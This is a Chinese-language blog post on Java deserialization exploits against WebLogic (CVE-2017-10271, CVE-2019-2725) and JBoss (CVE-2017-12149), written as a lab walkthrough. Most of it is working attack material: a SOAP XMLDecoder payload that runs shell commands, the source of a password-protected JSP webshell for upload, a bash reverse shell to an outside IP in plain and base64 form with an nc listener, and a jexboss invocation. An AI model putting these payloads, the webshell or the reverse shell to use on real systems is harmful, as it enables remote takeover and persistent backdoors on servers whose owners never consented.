---
layout: post
title:  Java反序列化漏洞
date:   2022-06-04 00:08:01 +0300
image:  2022-06-04-woman.jpg
tags:   [web,java,deserialization]
---

# Weblogic CVE-2017-10271

首先看一下Weblogic经典的404页面

![]({{site.baseurl}}/img/deserialization/2022-06-04-404.jpg)

测试一下是否存在wls-wsat组件，访问http://192.168.48.131:7001/wls-wsat/CoordinatorPortType

发现存在漏洞页面

![]({{site.baseurl}}/img/deserialization/2022-06-04-wls-wsat.jpg)

编写EXP

```assembly
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.6.0" class="java.beans.XMLDecoder">
                <object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-C</string>
                        </void>
                        <void index="2">
                            <string>payload</string>
                        </void>
                    </array>
                    <void method="start"/>
                </object>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

遇到命令中有特殊字符的情况下可以使用：

http://www.jackson-t.ca/runtime-exec-payloads.html网站进行Bash编码处理

对http://192.168.48.131:7001/wls-wsat/CoordinatorPortType抓包，修改GET为POST，增加/修改Content-Type:text/xml，发送数据包。

准备一个JSP的CMDshell

```assembly
<%
	if("x".equals(request.getParameter("pwd"))){
		java.io.InputStreamin=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
		int a = -1;
		byte[] b = new byte[2048];
		out.print("<pre>");
		while((a=in.read(b))!=-1){
			out.println(new String(b));
		}
		out.print("</pre>");
	}
%>
```

上传该CMD shell，复制上传的webshell地址

http://192.168.48.131:7001/wls-wsat/acsa.jsp

测试是否可以执行

```assembly
?pwd=x&i=ifconfig
```

# Weblogic CVE-2019-2725

借助http://www.jackson-t.ca/runtime-exec-payloads.html网站将想要执行的反弹shell命令编码处理

```assembly
bash -i >& /dev/tcp/172.22.12.216/5555 0>&1
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjIuMTIuMjE2LzU1NTUgMD4mMQ==}|{base64,-d}|{bash,-i}
```

执行命令

服务器nc监听5555端口

```
nc -lvp 5555
```

![]({{site.baseurl}}/img/deserialization/2022-06-04-shell.jpg)

# JBoss CVE-2017-12149

python jexboss.py -host http://192.168.48.131:8080/